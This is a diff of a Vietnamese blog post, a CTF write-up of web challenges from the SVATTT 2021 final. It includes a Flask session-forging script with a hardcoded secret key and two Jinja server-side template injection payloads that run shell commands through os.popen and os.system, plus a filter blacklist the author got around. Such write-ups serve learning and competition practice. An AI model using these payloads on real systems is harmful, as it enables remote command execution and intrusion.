@@ -3,6 +3,7 @@ layout: post
 title: "WRITEUP SVATTT FINAL 2021: WEB"
 categories: CTF
 toc: true
+render_with_liquid: false
 ---
 Hé lô mọi người. Ở vòng loại của svattt vừa rồi thì mình không được vô chung kết để chinh chiến vòng đấu hấp dẫn này. Hôm nay là ngày diễn ra chung kết svattt, mình chỉ biết ngồi nhìn các đội chơi thấy hơi buồn 1 chút trong lòng :( , nhưng nhớ đến câu của một người anh nào đó "Không có gì phải buồn hết em, mình có thực lực thua mới buồn không có thực lực thì làm sao phải buồn" nên vì vậy sau khi end giải mình đã xin 1 vài challeng web để làm, tu luyện để hi vọng năm sau có cơ hội vô chung kết. Thôi không luyên thuyên nữa, dưới đây là một số bài mà mình solved được, mình muốn ghi lại vì thấy nó hay cũng như học được nhiều thứ từ những challenge này. Bài viết của niuu baii nên có sai sót thì mọi người góp ý nhé ^^
 
@@ -188,7 +189,7 @@ if len(sys.argv) < 2:
 URL = sys.argv[1]
 
 SECRET_KEY = '476345fdc597d6cb6dd68ae949b2694a'
-PAYLOAD = {u'is_admin':1,u'username':"""{\%print(lipsum|attr("__globals__"))|attr("__getitem__")("os")|attr("popen")("/readflag")|attr("read")()%}"""}
+PAYLOAD = {u'is_admin':1,u'username':"""{%print(lipsum|attr("__globals__"))|attr("__getitem__")("os")|attr("popen")("/readflag")|attr("read")()%}"""}
 
 def getSession():
 	cookie = encodeFlaskCookie(SECRET_KEY, PAYLOAD)
@@ -205,10 +206,10 @@ if __name__ == "__main__":
 ```
 Chạy file này với command `python3 payload.py http://34.124.209.122:1337`. Nếu có source deploy trên local thì thay bằng url local
 ![image](https://user-images.githubusercontent.com/54855855/141679163-21adcb12-0fbc-46f6-b811-a70fc86142d2.png)
-BONUS: Tối hôm đó mình solved, có vẻ như chall vẫn đang được patch bằng cách replace thêm 1 số kí tự như `["\{\{","/", "*", "'", '"', "o","r"]`. Vì vậy mình không thể solved bằng payload trên mà mình đã thay bằng:
+BONUS: Tối hôm đó mình solved, có vẻ như chall vẫn đang được patch bằng cách replace thêm 1 số kí tự như `["{{","/", "*", "'", '"', "o","r"]`. Vì vậy mình không thể solved bằng payload trên mà mình đã thay bằng:
 ```
-\{\{config.__class__.__init__.__globals__['os'].system('/?eadflag > /tmp/taidh')\}\}
+{{config.__class__.__init__.__globals__['os'].system('/?eadflag > /tmp/taidh')}}
 ```
-Cuối cùng mình sử dụng `xml` lúc đầu để đọc `environ` để đọc flag bằng đường dẫn `/tmp/taidh`. Nhưng mình không hiểu tại sao vẫn có thể sài `"` `'` và `\{\{` bình thường mặc dù nó nằm trong `blacklist`. Chỉ có mỗi `r` bị replace :D
+Cuối cùng mình sử dụng `xml` lúc đầu để đọc `environ` để đọc flag bằng đường dẫn `/tmp/taidh`. Nhưng mình không hiểu tại sao vẫn có thể sài `"` `'` và `{{` bình thường mặc dù nó nằm trong `blacklist`. Chỉ có mỗi `r` bị replace :D
 
 # UPDATING CÁC CHALLENG CÒN LẠI
